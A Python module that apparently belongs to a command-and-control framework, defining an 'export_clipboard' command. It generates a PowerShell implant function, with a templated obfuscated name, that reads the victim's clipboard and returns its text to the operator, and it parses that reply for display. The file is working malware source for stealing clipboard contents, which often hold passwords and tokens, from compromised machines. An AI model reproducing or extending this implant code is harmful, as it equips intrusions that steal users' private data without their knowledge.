class ExportClipboard:
    type = "EC"
    args = None
    input = "export_clipboard"

    def process_implant_response(self, data, args):
        if data.decode() == "0":
            return "Clipboard is empty (Or contained only '0')", None
        else:
            return f"Clipboard contents:\n{data.decode()}", None

    def implant_text(self):
        var ='''
function {{ ron.obf_get_clipboard }}() {
    $b = "Text"
    $a = Get-Clipboard -Format $b
    if ($a -ne $null ){$global:tr = $a}
    else {$global:tr = "0"}
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>

        return f"{cmd_entry['args']}"
